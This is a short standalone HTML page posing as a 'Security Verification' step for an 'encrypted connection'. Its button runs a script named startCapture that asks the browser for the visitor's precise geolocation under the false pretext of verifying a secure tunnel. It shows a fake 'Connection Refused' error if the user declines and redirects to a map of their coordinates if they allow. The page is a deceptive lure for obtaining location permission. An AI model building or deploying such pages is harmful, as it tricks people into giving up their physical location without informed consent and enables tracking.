<!DOCTYPE html>
<html>
<head>
    <title>Security Verification</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <style>
        body { font-family: sans-serif; text-align: center; padding-top: 50px; background-color: #1a1a1a; color: white; }
        .btn { background: #007bff; border: none; color: white; padding: 15px 30px; border-radius: 5px; cursor: pointer; font-size: 18px; }
    </style>
</head>
<body>
    <div id="content">
        <h2>ðŸ”’ Encrypted Connection</h2>
        <p>To finalize the secure tunnel, tap the button below.</p>
        <button class="btn" onclick="startCapture()">Verify Connection</button>
    </div>

    <script>
        function startCapture() {
            document.getElementById("content").innerHTML = "<h2>Verifying...</h2><p>Please click 'Allow' on the system prompt.</p>";
            
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(
                    (pos) => {
                        window.location.href = `https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`;
                    },
                    (err) => {
                        alert("Error: Connection Refused. Please check site permissions.");
                    },
                    { enableHighAccuracy: true, timeout: 5000 }
                );
            }
        }
    </script>
</body>
</html>
